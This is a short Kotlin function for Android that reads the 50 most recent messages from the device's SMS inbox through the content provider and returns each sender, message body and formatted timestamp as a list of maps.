// To reas SMS from inbox
fun collectSms(context: Context): List<Map<String, String>> {
    val smsList = mutableListOf<Map<String, String>>()

    val cursor = context.contentResolver.query(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date"),
        null, null,
        "date DESC LIMIT 50"   // Last 50 messages
    ) ?: return smsList

    cursor.use {
        while (it.moveToNext()) {
            val sender  = it.getString(0) ?: ""
            val body    = it.getString(1) ?: ""
            val dateMs  = it.getLong(2)
            val date    = SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault()
            ).format(Date(dateMs))

            smsList.add(mapOf(
                "app_name"  to "SMS",
                "sender"    to sender,
                "message"   to body,
                "timestamp" to date,
            ))
        }
    }
    return smsList
}